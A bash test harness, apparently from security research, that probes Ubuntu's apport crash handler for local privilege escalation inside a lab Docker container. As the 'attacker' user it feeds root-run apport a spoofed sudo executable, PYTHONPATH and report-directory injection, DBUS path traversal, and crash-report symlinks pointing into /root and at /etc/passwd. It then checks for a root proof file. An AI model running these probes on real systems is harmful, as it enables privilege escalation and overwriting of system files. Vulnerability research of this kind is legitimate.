#!/usr/bin/env bash
set -Eeuo pipefail

container="${1:-${CONTAINER:-ubuntu24-server-lpe-target}}"
attacker="${ATTACKER_USER:-attacker}"
prefix="codex_apport_meta"

section() {
  printf '\n== %s ==\n' "$*"
}

section "target and apport defaults"
docker exec "$container" bash -lc '
set -u
cat /etc/os-release | sed -n "1,8p"
uname -a
id "'"$attacker"'"
echo "-- packages"
dpkg-query -W -f="\${binary:Package}\t\${Version}\t\${db:Status-Abbrev}\n" \
  apport apport-core-dump-handler python3-apport python3-problem-report \
  systemd-coredump whoopsie 2>/dev/null | sort || true
echo "-- units and paths"
systemctl list-unit-files "apport*" "systemd-coredump*" "whoopsie*" --no-pager || true
for p in /var/crash /run/apport.socket /var/lib/apport /var/lib/apport/coredump /var/lib/apport/autoreport /usr/bin/whoopsie; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc "%F %A %a %U:%G %n" "$p"
  else
    echo "MISSING $p"
  fi
done
sysctl kernel.core_pattern fs.suid_dumpable kernel.core_pipe_limit 2>/dev/null || true
'

section "metadata parser and report path probes"
docker exec -i -e ATTACKER_USER="$attacker" -e PREFIX="$prefix" "$container" bash <<'TARGET'
set -Eeuo pipefail

attacker="${ATTACKER_USER:-attacker}"
prefix="${PREFIX:-codex_apport_meta}"
uid="$(id -u "$attacker")"
gid="$(id -g "$attacker")"
base="/home/${attacker}/${prefix}"
root_proof="/root/${prefix}_root_proof"
spoof_report="/var/crash/_usr_bin_sudo.${uid}.crash"
spoof_hanging="/var/crash/_usr_bin_sudo.${uid}.hanging"
script_report="/var/crash/_home_${attacker}_${prefix}_real cwd_hold.py.${uid}.crash"
pids=()

stat_path() {
  for p in "$@"; do
    if [ -e "$p" ] || [ -L "$p" ]; then
      stat -Lc "%F %A %a %U:%G %s %n -> %N" "$p" 2>/dev/null || stat -c "%F %A %a %U:%G %s %N" "$p"
    else
      echo "MISSING $p"
    fi
  done
}

as_attacker() {
  setpriv --reuid="$uid" --regid="$gid" --clear-groups "$@"
}

run_apport_for_pid() {
  local pid="$1"
  local exe_arg="$2"
  printf 'root apport: pid=%s exe_arg=%s\n' "$pid" "$exe_arg"
  set +e
  printf '%s\n' "${prefix}_fake_core" | /usr/share/apport/apport -p"$pid" -s11 -c-1 -d1 -u"$uid" -g"$gid" -- "$exe_arg" 2>&1 | sed -n '1,80p'
  local rc=${PIPESTATUS[0]}
  set -e
  echo "apport_rc=$rc"
}

show_report() {
  local report="$1"
  if [ ! -f "$report" ]; then
    echo "MISSING report $report"
    return
  fi
  python3 - "$report" <<'PY'
import sys
from problem_report import ProblemReport

report = ProblemReport()
with open(sys.argv[1], "rb") as f:
    report.load(f, binary="compressed")
for key in ("ProblemType", "ExecutablePath", "InterpreterPath", "Package",
            "Signal", "ProcCmdline", "ProcCwd", "ProcEnviron", "UserGroups"):
    print(f"{key}: {report.get(key, '<missing>')!r}")
PY
}

cleanup() {
  set +e
  for pid in "${pids[@]:-}"; do
    kill "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
  done
  rm -rf "$base" "/tmp/${prefix}"*
  rm -f "$root_proof" /root/"${prefix}"_*
  rm -f "$spoof_report" "${spoof_report%.crash}.upload" "${spoof_report%.crash}.uploaded" "$spoof_hanging"
  find /var/crash -maxdepth 1 -name "*${prefix}*" -exec rm -f -- {} + 2>/dev/null || true
  find /var/lib/apport/coredump -maxdepth 1 -name "*${prefix}*" -exec rm -f -- {} + 2>/dev/null || true
}
trap cleanup EXIT
cleanup

install -d -o "$uid" -g "$gid" -m 0700 "$base" "$base/real cwd" "$base/py"
cat > "$base/real cwd/hold.py" <<PY
#!/usr/bin/python3
import os
import time
open("/tmp/${prefix}_child_started", "w", encoding="utf-8").write(
    "uid=%s euid=%s cwd=%s\\nPYTHONPATH=%s\\nAPPORT_REPORT_DIR=%s\\nDBUS_SESSION_BUS_ADDRESS=%s\\n" % (
        os.getuid(), os.geteuid(), os.getcwd(), os.environ.get("PYTHONPATH"),
        os.environ.get("APPORT_REPORT_DIR"), os.environ.get("DBUS_SESSION_BUS_ADDRESS")
    )
)
while True:
    time.sleep(1)
PY
chown "$uid:$gid" "$base/real cwd/hold.py"
chmod 0755 "$base/real cwd/hold.py"
ln -s "real cwd" "$base/cwd-link"

cat > "$base/py/sitecustomize.py" <<PY
import os
open("/tmp/${prefix}_sitecustomize_uid", "a", encoding="utf-8").write(
    "uid=%s euid=%s\\n" % (os.getuid(), os.geteuid())
)
PY
chown "$uid:$gid" "$base/py/sitecustomize.py"
chmod 0644 "$base/py/sitecustomize.py"

echo "-- attacker-controlled interpreted process metadata"
setpriv --reuid="$uid" --regid="$gid" --clear-groups \
  env -i HOME="/home/$attacker" USER="$attacker" LOGNAME="$attacker" PATH="/usr/bin:/bin" \
  CWD_TARGET="$base/cwd-link" PYTHONPATH="$base/py" APPORT_REPORT_DIR="/root/${prefix}_report_dir" \
  APPORT_COREDUMP_DIR="/root/${prefix}_core_dir" \
  DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/${uid}/bus/../../root/${prefix}" \
  bash -c 'cd "$CWD_TARGET"; exec /usr/bin/python3 ./hold.py "arg with spaces" "semi;colon"' &
pids+=("$!")
sleep 1
pid_script="${pids[0]}"
echo "script_pid=$pid_script"
stat_path "/proc/$pid_script/exe" "/proc/$pid_script/cwd" "$base/cwd-link" "$base/real cwd/hold.py"
cat "/tmp/${prefix}_child_started"
run_apport_for_pid "$pid_script" "/usr/bin/python3"
stat_path "$script_report" "/tmp/${prefix}_sitecustomize_uid" "/root/${prefix}_sitecustomize" "/root/${prefix}_report_dir" "/root/${prefix}_core_dir"
show_report "$script_report"

echo "-- spoofed packaged executable argument against a normal sleep process"
setpriv --reuid="$uid" --regid="$gid" --clear-groups /usr/bin/sleep 90 &
pids+=("$!")
sleep 1
pid_sleep="${pids[1]}"
echo "sleep_pid=$pid_sleep"
stat_path "/proc/$pid_sleep/exe" "$spoof_report"
run_apport_for_pid "$pid_sleep" "/usr/bin/sudo"
stat_path "$spoof_report" "$root_proof"
show_report "$spoof_report"

echo "-- precreated report symlink and hanging-marker semantics"
rm -f "$spoof_report" "$spoof_hanging" "$root_proof"
as_attacker ln -s "$root_proof" "$spoof_report"
as_attacker ln -s /etc/passwd "$spoof_hanging"
stat_path "$spoof_report" "$spoof_hanging" "$root_proof"
run_apport_for_pid "$pid_sleep" "/usr/bin/sudo"
stat_path "$spoof_report" "$spoof_hanging" "$root_proof"

echo "-- direct user attempts to reach default root consumers"
set +e
as_attacker touch /var/lib/apport/autoreport 2>&1
echo "touch_autoreport_rc=$?"
as_attacker systemctl start apport-autoreport.service 2>&1 | sed -n '1,8p'
echo "start_autoreport_rc=${PIPESTATUS[0]}"
as_attacker python3 - <<'PY'
import os
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    s.connect("/run/apport.socket")
    print("apport_socket_connect=OK")
except OSError as exc:
    print(f"apport_socket_connect=FAIL errno={exc.errno} {os.strerror(exc.errno)}")
PY
echo "socket_probe_rc=$?"
set -e

echo "-- root proof and leftovers"
if [ -e "$root_proof" ] || find /root -maxdepth 1 -name "${prefix}_*" -print -quit | grep -q .; then
  echo "ROOT_PROOF=YES"
  find /root -maxdepth 1 -name "${prefix}_*" -printf "%M %u:%g %s %p -> %l\n" | sort
else
  echo "ROOT_PROOF=NO"
fi
find /var/crash -maxdepth 1 \( -name "*${prefix}*" -o -name "_usr_bin_sudo.${uid}.crash" \) -printf "%M %u:%g %s %p -> %l\n" | sort || true
systemctl is-system-running 2>&1 || true
systemctl --failed --no-legend --no-pager || true
TARGET
